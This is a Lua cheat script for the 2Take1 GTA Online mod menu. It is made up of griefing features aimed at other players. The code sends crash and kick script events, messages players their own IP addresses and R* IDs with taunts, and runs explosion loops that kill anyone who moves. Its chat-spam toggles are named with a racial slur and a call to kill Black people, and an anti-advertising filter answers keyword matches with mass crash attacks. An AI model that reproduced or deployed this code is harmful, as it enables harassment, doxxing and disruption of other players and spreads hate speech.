        local we, Ped, pid = gameplay.get_hash_key("WEAPON_RAILGUN"), player.get_player_ped(player.player_id()), player.player_id()
        while f.on do
          local Pos, d = get_collision_vector(pid, Ped)
          if d > 3 then
              gameplay.shoot_single_bullet_between_coords(Pos + v3(0, 0, 3), Pos, 1000, we, Ped, true, false, 250)
          end
          system.yield(0)
        end
      end)


---------------- lobby chat below -------------------------------------------
menu.add_feature("disable session chat", "toggle", lobbychat.id, function(feat)
    if feat.on then
        network.send_chat_message(" ", false) end return HANDLER_CONTINUE
end)
menu.add_feature("disable session chat local only", "toggle", lobbychat.id, function(feat)
    if feat.on then
        network.send_chat_message(" ", true) end return HANDLER_CONTINUE
end)
menu.add_feature("send advertisement", "action", lobbychat.id, function(feat)
    if feat.on then
        network.send_chat_message("Galactic Menu script 4 2T1 is OP", false) network.send_chat_message("join the discord: https://discord.gg/wq2Y4FJKzC", false) end
end)
menu.add_feature("send MS THE BEST", "action", lobbychat.id, function(feat)
    if feat.on then
        network.send_chat_message("Ms-13#0069 on discord is the best", false) network.send_chat_message("join his discord: https://discord.gg/wq2Y4FJKzC", false) end
end)
menu.add_feature("paste clipboard", "action", lobbychat.id, function(feat)
    if feat.on then
        clipboard = utils.from_clipboard() network.send_chat_message(clipboard, false) end
end)

menu.add_feature("starting a race", "action", lobbychat.id, function(feat)
    if feat.on then
        network.send_chat_message("go on GO", false) system.wait(1500) network.send_chat_message("5", false) system.wait(800) network.send_chat_message("4", false) system.wait(800) network.send_chat_message("3", false) system.wait(800) network.send_chat_message("2", false) system.wait(800) network.send_chat_message("1", false) system.wait(800) network.send_chat_message("GO", false) end
end)

menu.add_feature("spam everyone with random messages", "toggle", lobbychat.id, function(feat)
    if feat.on then
    for pid = 0, 32 do if pid ~= me then local message = math.random(1, 5) if message == 1 then player.send_player_sms(pid, "get good get Galactic lua for 2take1") system.wait(250) end if message == 2 then player.send_player_sms(pid, "get good get like"..my_name.."") system.wait(250) end if message == 3 then player.send_player_sms(pid, "LOL Ezzzzz") system.wait(250) end if message == 4 then player.send_player_sms(pid, "Galactic lua on top https://discord.gg/wq2Y4FJKzC") system.wait(250) end if message == 5 then player.send_player_sms(pid, "crash modders with Galactic lua") system.wait(250) end end end end return HANDLER_CONTINUE
    end)

    menu.add_feature("send everyone advertisement", "action", lobbychat.id, function(feat)
        if feat.on then
            for pid = 0, 32 do if pid ~= me then player.send_player_sms(pid, "Galactic Menu script 4 2T1 is OP https://discord.gg/wq2Y4FJKzC") end end end
        end)
        menu.add_feature("send everyone there own ip", "action", lobbychat.id, function(feat)
            if feat.on then
                for pid = 0, 32 do if pid ~= me then local there_ip = player.get_player_ip(pid) player.send_player_sms(pid, "lol got your ip kid"..there_ip.."") end end end
            end)
            menu.add_feature("send everyone there own rid", "action", lobbychat.id, function(feat)
                if feat.on then for pid = 0, 32 do if pid ~= me then local there_scid = player.get_player_scid(pid) player.send_player_sms(pid, "lol got your rid kid"..there_scid.."") end end end
                end)
                menu.add_feature("send everyone custom sms", "action", lobbychat.id, function(feat)
                    if feat.on then
                        local custom, SC = input.get("Enter Custom SMS", "", 128, 0) while custom == 1 do system.yield(0) custom, SC = input.get("Enter Custom SMS", "", 128, 0) system.wait(27) for pid = 0, 32 do if pid ~= me then player.send_player_sms(pid, ""..SC.."") end end end end
                    end)

                    menu.add_feature("Songify Chat", "action", lobbychat.id, function()
                        menu.notify("You MUST turn your mic on and sing along", "", 10, 2)
                        for i =1, #Lyrics do
                           network.send_chat_message(Lyrics[i], false)
                           system.wait(1250)
                        end
                     end)

                     menu.add_feature("Songify Chat 2", "action", lobbychat.id, function()
                        menu.notify("You MUST turn your mic on and sing along", "", 10, 2)
                        for i =1, #Lyrics do
                           network.send_chat_message(Lyrics2[i], false)
                           system.wait(1250)
                        end
                     end)

                     menu.add_feature("Songify Chat 3", "action", lobbychat.id, function()
                        menu.notify("You MUST turn your mic on and sing along", "", 10, 2)
                        for i =1, #Lyrics do
                           network.send_chat_message(Lyrics3[i], false)
                           system.wait(1250)
                        end
                     end)

                     menu.add_feature("Songify Chat 4", "action", lobbychat.id, function()
                        menu.notify("You MUST turn your mic on and sing along", "", 10, 2)
                        for i =1, #Lyrics do
                           network.send_chat_message(Lyrics4[i], false)
                           system.wait(1250)
                        end
                     end)

                     menu.add_feature("Songify Chat 5", "action", lobbychat.id, function()
                        menu.notify("You MUST turn your mic on and sing along", "", 10, 2)
                        for i =1, #Lyrics do
                           network.send_chat_message(Lyrics5[i], false)
                           system.wait(1250)
                        end
                     end)

                     menu.add_feature("Songify Chat 6", "action", lobbychat.id, function()
                        menu.notify("You MUST turn your mic on and sing along", "", 10, 2)
                        for i =1, #Lyrics do
                           network.send_chat_message(Lyrics6[i], false)
                           system.wait(1250)
                        end
                     end)

                     menu.add_feature("nigger", "toggle", lobbychat.id, function()
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("get 2take1 you poor bitch", "toggle", lobbychat.id, function()
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat2[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("crash me you won't", "toggle", lobbychat.id, function()
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat3[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("fuck trump", "toggle", lobbychat.id, function()
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat4[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("covid is fake", "toggle", lobbychat.id, function(toggle)
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat5[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("covid is real", "toggle", lobbychat.id, function()
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat6[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("all blacks need to be locked up and killed", "toggle", lobbychat.id, function()
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat7[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("fuck the whites", "toggle", lobbychat.id, function()
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat8[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("every blocked gta word to many too count", "toggle", lobbychat.id, function()
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat9[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("i am OP", "toggle", lobbychat.id, function()
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat10[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)

                     menu.add_feature("i am the BEST", "toggle", lobbychat.id, function(feat)
                        for i =1, #Spamchat do
                           network.send_chat_message(Spamchat11[i], false)
                           system.wait(1250)
                        end
                        return HANDLER_CONTINUE
                     end)
------------------ lobby chat above ---------------------------------------
------------------- lobby misc below --------------------------------------

hide_map = menu.add_feature(
    "Hide yourself on the map"
    ,"toggle",
    lobbymisc.id,
    function(a)
        while a.on do
            system.yield(0)
            if a.on then
                local me = player.player_id()
                local myid = player.get_player_ped(me)
                ped.set_ped_max_health(myid,0)
                ped.set_ped_health(myid,1000)
            else
                local me = player.player_id()
                local myid = player.get_player_ped(me)
                ped.set_ped_max_health(myid,328)
                ped.set_ped_health(myid,328)
            end
        end
    end
)
hide_map.on = true

orbitalProxy = menu.add_feature("Add Orbital Proximity Blip", "value_f", lobbymisc.id, function(feat)
	if not feat.on then
	orbitalProxy_colour.hidden = true
	if ObitalBlip ~= nil then
	ui.remove_blip(ObitalBlip)
	ObitalBlip = nil
	end
	return HANDLER_POP
	end
	system.yield(600)
	system.yield(600)
	local pos = v3(339.379,4836.629,-58.999)
	if ObitalBlip == nil then
	ObitalBlip = ui.add_blip_for_radius(pos, feat.value)
	ui.set_blip_colour(ObitalBlip, 79)
	BlipIDs[#BlipIDs+1] = ObitalBlip
	orbitalProxy_colour.hidden = false
	end
	system.yield(600)
	return HANDLER_CONTINUE
end)
orbitalProxy.max = 120.00
orbitalProxy.min = 0.01
orbitalProxy.value = 18.05
orbitalProxy.mod = 0.10
orbitalProxy.on = true

menu.add_feature("set Bounty on Lobby", "action", lobbymisc.id, function(feat)
for pid = 0, 32 do
if player.is_player_valid(pid) then
Send_Bounty(pid)
system.wait(100)
end
end
end)

menu.add_feature("Block all players Passive", "action", lobbymisc.id, function(feat)
	blockpassiveall()
end)



------------------- lobby misc above --------------------------------------
--------------------- lobby troll below -----------------------------------
menu.add_feature("Everyone is a Dick Head!", "action", lobbytroll.id, function(feat)
	for i = 0, 32 do
		pped = player.get_player_ped(i)
		if pped ~= 0 then
			local pos, rot, offset = v3(), v3(), v3()
			offset.x = 0.08
			offset.y = 0.0
			offset.z = 0.0
			rot.x = 40
			rot.y = -83
			rot.z = -134
			local bid = ped.get_ped_bone_index(pped, 65068)
			local hash = gameplay.get_hash_key("v_res_d_dildo_f")
			spawned_cunts[#spawned_cunts + 1]  = object.create_object(hash, pos, true, false)
			entity.attach_entity_to_entity(spawned_cunts[#spawned_cunts], pped, bid, offset, rot, true, false, false, 0, true)
		end
	end
	return HANDLER_POP
end)

menu.add_feature("Everyone is a Dick Head! 2", "action", lobbytroll.id, function(feat)
	for i = 0, 32 do
		pped = player.get_player_ped(i)
		if pped ~= 0 then
			local pos, rot, offset = v3(), v3(), v3()
			offset.x = 0.08
			offset.y = 0.0
			offset.z = 0.0
			rot.x = 40
			rot.y = -83
			rot.z = -134
			local bid = ped.get_ped_bone_index(pped, 65068)
			local hash = gameplay.get_hash_key("v_res_d_dildo_a")
			spawned_cunts[#spawned_cunts + 1]  = object.create_object(hash, pos, true, false)
			entity.attach_entity_to_entity(spawned_cunts[#spawned_cunts], pped, bid, offset, rot, true, false, false, 0, true)
		end
	end
	return HANDLER_POP
end)

menu.add_feature("Give all Dildo Dicks", "action", lobbytroll.id, function(feat)
	for i = 0, 32 do
		pped = player.get_player_ped(i)
		if pped ~= 0 then
			local pos, rot, offset = v3(), v3(), v3()
			offset.x = 0.0
			offset.y = 0.0
			offset.z = 0.0
			rot.x = 293.0
			rot.y = 28.0
			rot.z = 24.0
			local bid = ped.get_ped_bone_index(pped, 23553)
			local hash = gameplay.get_hash_key("v_res_d_dildo_f")
			spawned_cunts[#spawned_cunts + 1] = object.create_object(hash, pos, true, true)
			entity.attach_entity_to_entity(spawned_cunts[#spawned_cunts], pped, bid, offset, rot, true, false, false, 0, true)
		end
	end
	return HANDLER_POP
end)

menu.add_feature("Give all Dildo Dicks 2", "action", lobbytroll.id, function(feat)
	for i = 0, 32 do
		pped = player.get_player_ped(i)
		if pped ~= 0 then
			local pos, rot, offset = v3(), v3(), v3()
			offset.x = 0.0
			offset.y = 0.0
			offset.z = 0.0
			rot.x = 293.0
			rot.y = 28.0
			rot.z = 24.0
			local bid = ped.get_ped_bone_index(pped, 23553)
			local hash = gameplay.get_hash_key("v_res_d_dildo_b")
			spawned_cunts[#spawned_cunts + 1] = object.create_object(hash, pos, true, true)
			entity.attach_entity_to_entity(spawned_cunts[#spawned_cunts], pped, bid, offset, rot, true, false, false, 0, true)
		end
	end
	return HANDLER_POP
end)


local redlight = false
  local squid_join, squid_leave
    menu.add_feature("SquidGame", "value_str", lobbytroll.id, function(feat)
      if feat.on then
        if feat.value == 0 then
          if not redlight then
            for i = 1, 10 do
              network.send_chat_message("Red Light! DON'T MOVE!!!", false)
              system.yield(5)
            end
            for pids = 1, player.player_count() do 
              player_coords[pids] = player.get_player_coords(pids)
            end
            print("Player_coords:"..#player_coords)
            squid_join = event.add_event_listener("player_join", function(i)
              menu.notify("New player joined.\n The player will join the game at the next Red Light", "sG.wolf's script public ver", 3, 10)
            end)
            squid_leave = event.add_event_listener("player_leave", function(i)
              table.remove(player_coords, i.player)
              print("leave event Player_coords:"..#player_coords)
            end)
            redlight = true
            menu.notify("Red Light", "sG.wolf's script public ver", 3 ,10)
          end
          system.yield(3000)
          for i = 1, #player_coords do
            if player_coords[i] ~= player.get_player_coords(i) and i ~= player.player_id() then
              for x = 1, 30 do
                fire.add_explosion(player.get_player_coords(i), 0, true, true, 0.0, player.get_player_ped(i))
                system.yield(10)
                if entity.is_entity_dead(player.get_player_ped(i)) then
                  break
                end
                if x == 30 then
                  if player.get_player_name(i) ~= nil then
                    menu.notify("I can't kill "..player.get_player_name(i), "sG.wolf's script public ver", 3 ,10)
                  end
                end
              end
            end
          end
          return HANDLER_CONTINUE
        else --feat.value == 1
          if redlight then
            for i = 1, 10 do
              network.send_chat_message("Green Light! Now you can move.", false)
              system.yield(5)
            end
            player_coords = {}
            if squid_join ~= nil and squid_leave ~= nil then
              event.remove_event_listener("player_join", squid_join)
              event.remove_event_listener("player_leave", squid_leave)
            end
            redlight = false
            menu.notify("Green Light", "sG.wolf's script public ver", 3 ,10)
          end
        end
      end
      if feat.on == false then
        if squid_join ~= nil and squid_leave ~= nil then
          event.remove_event_listener("player_join", squid_join)
          event.remove_event_listener("player_leave", squid_leave)
        end
        return HANDLER_POP
      end
    end):set_str_data{"Red", "Green"}


    --- NEW 
    local Anti_MK2=menu.add_feature(
    "Anti-MK2",
    "toggle",
    lobbytroll.id,
    function(a)
        while a.on do
            system.yield(0)
            for pid=0,31 do
                if player.is_player_vaild(pid) and player.is_player_in_any_vehicle(pid) then
                    Anti_Vehicle_Func(player.get_player_vehicle(pid),2069146067,pid,"MK2")
                end
            end
        end
    end
)
local Anti_MK1=menu.add_feature(
    "AntiMK1",
    "toggle",
    lobbytroll.id,
    function(a)
        while a.on do
            system.yield(0)
            for pid=0,31 do
                if player.is_player_vaild(pid) and player.is_player_in_any_vehicle(pid) then
                    Anti_Vehicle_Func(player.get_player_vehicle(pid),884483972,pid,"MK1")
                end
            end
        end
    end
)

--------------------- lobby troll above -----------------------------------
---------------------- MENU SETTINGS --------------------------------------

local key_words={
    "QQ",
    "VX",
    "V.X",
    "Q.Q",
    "vx",
    "qq",
    "q.q",
    "v.x",
    "shua",
    "Shua",
    "SHUA",
    "SHUa",
    "sHUA",
    "微信",
    "威信",
    "萌新一起玩",
    "信用保障",
    "安全稳定",
    "解锁",
    "解所",
    "Q群",
    "q群",
    "全网最低",
    "全往最低",
    "店铺",
    "激情大片",
    "澳门赌场",
    "抠逼自慰",
    "加群",
    "刷钱",
    "淘宝",
    "十年店铺",
    "支持花呗",
    "地堡刷金",
    "有妹子",
    "扣群",
    "扣扣",
    "Î¢ÐÅ",
    "ÍþÐÅ",
    "ÃÈÐÂÒ»ÆðÍæ",
    "ÐÅÓÃ±£ÕÏ",
    "°²È«ÎÈ¶¨",
    "½âËø",
    "½âËù",
    "QÈº",
    "qÈº",
    "È«Íø×îµÍ",
    "È«Íù×îµÍ",
    "µêÆÌ",
    "¼¤Çé´óÆ¬",
    "°ÄÃÅ¶Ä³¡",
    "¿Ù±Æ×ÔÎ¿",
    "¼ÓÈº",
    "Ë¢Ç®",
    "ÌÔ±¦",
    "Ê®ÄêµêÆÌ",
    "Ö§³Ö»¨ßÂ",
    "µØ±¤Ë¢½ð",
    "ÓÐÃÃ×Ó",
    "¿ÛÈº",
    "¿Û¿Û",
    "Е�®Д©ӯ",
    "Е�ғД©ӯ",
    "ХҚҲФ–°Д�қХӢ·ГҶ�",
    "Д©ӯГ”�Д©�И��",
    "Е®‰Е…�Г�ЁЕ®�",
    "Х§ёИ”ғ",
    "Х§ёФ‰қ",
    "QГ�¤",
    "qГ�¤",
    "Е…�Г�‘Ф�қД�Ҷ",
    "Е…�Е�қФ�қД�Ҷ",
    "Е�—И“�",
    "Ф©қФҒ…Е¤§Г‰‡",
    "Ф�ЁИ—�ХӢҲЕ��",
    "Фҳ�Иқ�Х‡�Ф…°",
    "Еҳ�Г�¤",
    "Е�·И’±",
    "Ф·�Е®�",
    "ЕҷғЕ№�Е�—И“�",
    "Ф”�ФҲғХҳ±Е‘—",
    "Е�°Е�ӯЕ�·И‡‘",
    "Ф�‰Е¦№Е­Қ",
    "Ф‰ёГ�¤",
    "Ф‰ёФ‰ё",
    "寰�淇�",
    "濞佷俊",
    "钀屾柊涓€璧风帺",
    "淇＄敤淇濋殰",
    "瀹夊叏绋冲畾",
    "瑙ｉ攣",
    "瑙ｆ墍",
    "Q缇�",
    "q缇�",
    "鍏ㄧ綉鏈€浣�",
    "鍏ㄥ線鏈€浣�",
    "搴楅摵",
    "婵€鎯呭ぇ鐗�",
    "婢抽棬璧屽満",
    "鎶犻€艰嚜鎱�",
    "鍔犵兢",
    "鍒烽挶",
    "娣樺疂",
    "鍗佸勾搴楅摵",
    "鏀�鎸佽姳鍛�",
    "鍦板牎鍒烽噾",
    "鏈夊�瑰瓙",
    "鎵ｇ兢",
    "鎵ｆ墸",
    "ๅพฎไฟก",
    "ๅจ�ไฟก",
   "��ๆ–ฐไธ€่ตท็�ฉ",
   "ไฟก็”จไฟ�้��",
   "ๅฎ�ๅ…จ็จณๅฎ�",
   "งฃ้”�",
   "งฃๆ�€",
   "Q็พค",
   "q็พค",
    "ๅ…จ็ฝ‘ๆ�€ไฝ�",
    "ๅ…จๅพ€ๆ�€ไฝ�",
    "ๅบ—้“บ",
    "ๆฟ€ๆ�…ๅคง็��",
    "ๆพณ้—จ่ต�ๅ�บ",
    "ๆ� ้€ผ่�ชๆ…ฐ",
    "ๅ� ็พค",
    "ๅ�ท้’ฑ",
    "ๆท�ๅฎ�",
    "ๅ��ๅนดๅบ—้“บ",
    "ๆ”ฏๆ��่�ฑๅ‘—",
    "ๅ�ฐๅ กๅ�ท้�‘",
    "ๆ��ๅฆนๅญ�",
    "ๆ�ฃ็พค",
    "ๆ�ฃๆ�ฃ",
    ".com",
    ".cn",
    ".cc",
    ".xyz",
    ".top",
    ".us",
    ".ru",
    ".net",
    ".ad",
    ".ae",
    ".wang",
    ".pub",
    ".xin",
    ".cc",
    ".tv",
    ".uk",
    ".org",
    ".jp",
    ".edu",
    ".gov",
    ".mil",
    ".online",
    "ltd",
    ".shop",
    ".beer",
    ".art",
    ".luxe",
    ".co",
    ".vip",
    ".club",
    ".fun",
    ".tech",
    ".store",
    ".red",
    ".pro",
    ".kim",
    ".ink",
    ".group",
    ".work",
    ".ren",
    ".biz",
    ".mobi",
    ".site",
    ".asia",
    ".law",
    ".me",
    ".COM",
    ".CN",
    ".CC",
    ".XYZ",
    ".TOP",
    ".US",
    ".RU",
    ".NET",
    ".AD",
    ".AE",
    ".WANG",
    ".PUB",
    ".XIN",
    ".CC",
    ".TV",
    ".UK",
    ".ORG",
    ".JP",
    ".EDU",
    ".GOV",
    ".MIL",
    ".ONLINE",
    ".LTD",
    ".SHOP",
    ".BEER",
    ".ART",
    ".LUXE",
    ".CO",
    ".VIP",
    ".CLUB",
    ".FUN",
    ".TECH",
    ".STORE",
    ".RED",
    ".PRO",
    ".KIM",
    ".INK",
    ".GROUP",
    ".WORK",
    ".REN",
    ".BIZ",
    ".MOBI",
    ".SITE",
    ".ASIA",
    ".LAW",
    ".ME",
    ".cloud",
    ".love",
    ".press",
    ".space",
    ".video",
    ".fit",
    ".yoga",
    ".info",
    ".design",
    ".link",
    ".live",
    ".wiki",
    ".life",
    ".world",
    ".run",
    ".show",
    ".city",
    ".gold",
    ".today",
    ".plus",
    ".cool",
    ".icu",
    ".company",
    ".chat",
    ".zone",
    ".fans",
    ".host",
    ".center",
    ".email",
    ".fund",
    ".social",
    ".team",
    ".guru",
    ".CLOUD",
    ".LOVE",
    ".PRESS",
    ".SPACE",
    ".VIDEO",
    ".FIT",
    ".YOGA",
    ".INFO",
    ".DESIGN",
    ".LINK",
    ".LIVE",
    ".WIKI",
    ".LIFE",
    ".WORLD",
    ".RUN",
    ".SHOW",
    ".CITY",
    ".GOLD",
    ".TODAY",
    ".PLUS",
    ".COOL",
    ".ICU",
    ".COMPANY",
    ".CHAT",
    ".ZONE",
    ".FANS",
    ".HOST",
    ".CENTER",
    ".EMAIL",
    ".FUND",
    ".SOCIAL",
    ".TEAM",
    ".GURU"
}

local key_words_name={
    "shua",
    "Shua",
    "SHua",
    "SHUa",
    "SHUA",
    "sHua",
    "sHUa",
    "sHUA",
    "shUa",
    "ShUA",
    "shuA",
    "coin",
    "Coin",
    "COin",
    "COIn",
    "COIN",
    "cOin",
    "cOIn",
    "cOIN",
    "QQ",
    "Qq",
    "qQ",
    "qq",
    'VX',
    "vx",
    "Vx",
    "vX",
    "Qqun",
    "qQun",
    "q_qun",
    "q_Qun",
    "Q_Qun",
    "Q_QUN",
}


-------------------Block advertising machine-----------------

menu.add_feature("Safe Space(anti-crash-cam)", "toggle", protections.id, function(feat)
    location = player.get_player_coords(player.player_id()) --save location
    menu.notify("Here is safe space!", "Galactic Menu", 1, 190)
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(-1006.402, 6272.383, 1.503)) --mazebank
    system.yield(10)
    while feat.on do
      entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(-8292.664, -4596.8257, 14358.0))--safe space
      system.yield(10000)
    end
    if feat.on == false then
      menu.notify("Wait a sec", "Galactic Menu", 2, 190)
    end
    system.yield(10)
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), location)
  end)



local user_name_trial=menu.add_feature(
    "Detect player name",
    "toggle",
    protections.id,
    function(a)
        if a.on then
            user_name_trial_id=event.add_event_listener("player_join",function(b)
                local pid=b.player
                local player_name=player.get_player_name(pid)
                for i=1,#key_words_name do
                    if player_name:match("%"..key_words_name[i]) then
                        menu.notify("A similar advertising machine nickname detected\nMixed crash + kicked out player + mixed mission + apartment invitation + sent to the island + wrong player name：\n\n"..player.get_player_name(pid).."\nR*ID为\n"..player.get_player_scid(pid),"Universe",6,8)
                        if player.is_player_valid(pid) then
                            for x=0,4 do
                                send_script_event("Crash "..tostring(x), pid, {pid, generic_player_global(pid)})
                            end
                        end
                        if player.is_player_valid(pid) then
                            network.network_session_kick_player(pid)
                            send_script_event("Netbail kick", pid, {pid, generic_player_global(pid)})
                        end
                        if player.is_player_valid(pid) then
                            for x=0,17 do
                                send_script_event("Kick "..tostring(x), pid, {pid, generic_player_global(pid)})
                            end
                        end
                        if player.is_player_valid(pid) then
                            send_script_event("Transaction error", pid, {pid, generic_player_global(pid)})
                        end
                        if player.is_player_valid(pid) then
                            for x=1,3 do
                                send_script_event("Script host crash "..tostring(x), pid, {pid, generic_player_global(pid)})
                            end
                        end
                        if player.is_player_valid(pid) then
                            for x=1,300 do
                                send_script_event("Send to mission"..tostring(x), pid, {pid, generic_player_global(pid)})
                            end
                        end
                        if player.is_player_valid(pid) then
                            for x=1,300 do
                                send_script_event("Send to Perico island"..tostring(x), pid, {pid, generic_player_global(pid)})
                            end
                        end
                        if player.is_player_valid(pid) then
                            for x=1,300 do
                                send_script_event("Apartment invite"..tostring(x), pid, {pid, generic_player_global(pid)})
                            end
                        end
                        return HANDLER_CONTINUE
                    end
                end
            end)
        else
            event.remove_event_listener("player_join",user_name_trial_id)
        end
    end
)
user_name_trial.hidden=true
user_name_trial.threaded=true










local Chat_trial=menu.add_feature(
    "Block advertising machine",
    "toggle",
    protections.id,
    function(a)
        if a.on then
            user_name_trial.on=true
            chat_trial_id=event.add_event_listener("chat",function(b)
                local pid=b.player
                local msg=b.body
                if pid~=player.player_id() and player.is_player_valid(pid) and not player.is_player_friend(pid) then
                    for i=1,#key_words do
                        if msg:match("%"..key_words[i]) then
                            menu.notify("Advertising player detected\nMixed crash + kicked out player + mixed mission + apartment invitation + sent to the island + wrong player name：\n\n"..player.get_player_name(pid).."\nR*ID\n"..player.get_player_scid(pid),"Galactic",6,8)
                            if player.is_player_valid(pid) then
                                for x=0,4 do
                                    send_script_event("Crash "..tostring(x), pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                network.network_session_kick_player(pid)
                                send_script_event("Netbail kick", pid, {pid, generic_player_global(pid)})
                            end
                            if player.is_player_valid(pid) then
                                for x=0,17 do
                                    send_script_event("Kick "..tostring(x), pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                send_script_event("Transaction error", pid, {pid, generic_player_global(pid)})
                            end
                            if player.is_player_valid(pid) then
                                for x=1,3 do
                                    send_script_event("Script host crash "..tostring(x), pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                for x=1,300 do
                                    send_script_event("Send to mission"..tostring(x), pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                for x=1,300 do
                                    send_script_event("Send to Perico island"..tostring(x), pid, {pid, generic_player_global(pid)})
                                end
                            end
                            if player.is_player_valid(pid) then
                                for x=1,300 do
                                    send_script_event("Apartment invite"..tostring(x), pid, {pid, generic_player_global(pid)})
                                end
                            end
                            return HANDLER_CONTINUE
                        end
                    end
                end
            end)
        else
            event.remove_event_listener("chat",chat_trial_id)
        end
    end
)
user_name_trial.on = true

local fuck_myself=menu.add_feature(
    "Øzark's emergency evacuation",
    "toggle",
    protections.id,
    function(a)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local pos=player.get_player_coords(me)
            if a.on then
                gameplay.clear_area_of_objects(pos,1000,0)
                gameplay.clear_area_of_vehicles(pos,100,false,false,false,false,false)
                gameplay.clear_area_of_peds(pos,1000,false)
                gameplay.clear_area_of_cops(pos,1000,false)
                for pid=0,31 do
                    if pid~=me and player.is_player_valid(pid) and a.on then
                        player.set_player_as_modder(pid,anti_sync)
                        player.set_player_visible_locally(pid,false)
                    end
                end
            else
                for pid=0,31 do
                    if pid~=me and player.is_player_valid(pid) then
                        player.unset_player_as_modder(pid,anti_sync)
                        player.set_player_visible_locally(pid,true)
                    end
                end
            end
        end
    end
)

local fuck_spectater=menu.add_feature(
    "Listener",
    "toggle",
    protections.id,
    function(a)
        local me=player.player_id()
        while a.on do
            system.yield(0)
            for pid=0,31 do
                if player.is_player_spectating(player.get_player_ped(pid)) and player.is_player_valid(pid) and pid~=me then
                    who = player.get_player_name(network.get_player_player_is_spectating(player.get_player_ped(pid)))
                    who_spec=player.get_player_name(player.get_player_ped(pid))
                    ui.draw_rect(0.001, 0.999, 4.5, 0.085, 0, 0, 0, 0)
                            ui.set_text_color(255, 255, 0, 255)				
                                    ui.set_text_scale(0.5)
                                    ui.set_text_font(0)
                                    ui.set_text_centre(true)
                                    ui.set_text_outline(true)
                                    ui.draw_text(who_spec.." Under observation "..who,v2(0.5,0.96))
                end
            end
        end
    end

)
local Anti_spectater=menu.add_feature(
    "Counter-observation",
    "toggle",
    protections.id,
    function(a)
        local me=player.player_id()
        local last_pos=player.get_player_coords(me)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            local last_pos=player.get_player_coords(me)
            if a.on then
                for pid=0,31 do
                    if player.is_player_spectating(ped.get_player_ped(pid)) and player.is_player_valid(pid) and pid~=me and network.get_player_player_is_spectating(ped.get_player_ped(pid))==me then
                        local pos=player.get_player_coords(pid)
                        entity.set_entity_coords_no_offset(my_ped,pos)
                        local me=player.player_id()
                        local my_ped=player.get_player_ped(me)
                        entity.set_entity_coords_no_offset(my_ped,last_pos)
                    end
                end
            else
                local me=player.player_id()
                local my_ped=player.get_player_ped(me)
                entity.set_entity_coords_no_offset(my_ped,last_pos)
            end
        end
    end

)

Anti_spectater.on = true


-------------- NEW PROTECTIONS
local protect_shield=menu.add_feature(
    "Glare shield",
    "slider",
    protections.id,
    function(a)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            fire.add_explosion(player.get_player_coords(me)+v3(0,0,a.value),70,false,false,0,player.get_player_ped(me))
        end
    end
)
protect_shield.max,protect_shield.min,protect_shield.mod=5,0,0.1


local invis_shield=menu.add_feature(
    "Aluminous Shield (anonymously planted)",
    "toggle",
    protections.id,
    function(a)
        ui.notify_above_map("请确保无敌已经开启\n请确保战局里有其他非好友玩家","",0)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local pid=math.random(0,31)
            local my_ped=player.get_player_ped(me)
            ped.set_ped_health(my_ped,3280)
            if pid~=me and player.is_player_valid(pid) and not player.is_player_friend(pid) then
                fire.add_explosion(player.get_player_coords(me),29,false,true,0,player.get_player_ped(pid))
            end
            system.yield(0)
            ped.set_ped_health(my_ped,328)
        end
    end
)
local invis_shield_v2=menu.add_feature(
    "Aluminous Shield (Anonymous)",
    "toggle",
    protections.id,
    function(a)
        ui.notify_above_map("请确保无敌已经开启","",0)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            ped.set_ped_health(my_ped,3280)
            fire.add_explosion(player.get_player_coords(me),29,false,true,0,me)
            system.yield(0)
            ped.set_ped_health(my_ped,328)
        end
    end
)
local invis_shield_v3=menu.add_feature(
    "Aluminous Shield",
    "toggle",
    protections.id,
    function(a)
        ui.notify_above_map("请确保无敌已经开启","",0)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            ped.set_ped_health(my_ped,3280)
            fire.add_explosion(player.get_player_coords(me),29,false,true,0,player.get_player_ped(me))
            system.yield(0)
            ped.set_ped_health(my_ped,328)
        end
    end
)

function pass()
    return nil
end

---------------------------------------------------------------------- HACKS END HERE MA JIGGA 
if login_start then
    main.name='Galactic Loading...'
    on_start.on=true
else
    on_start.on=false
    main_title.on=true
end

time_title.on=true
main_about.on=true
is_host.on=true
host_info.on=true





----------------------------抢劫-------------------------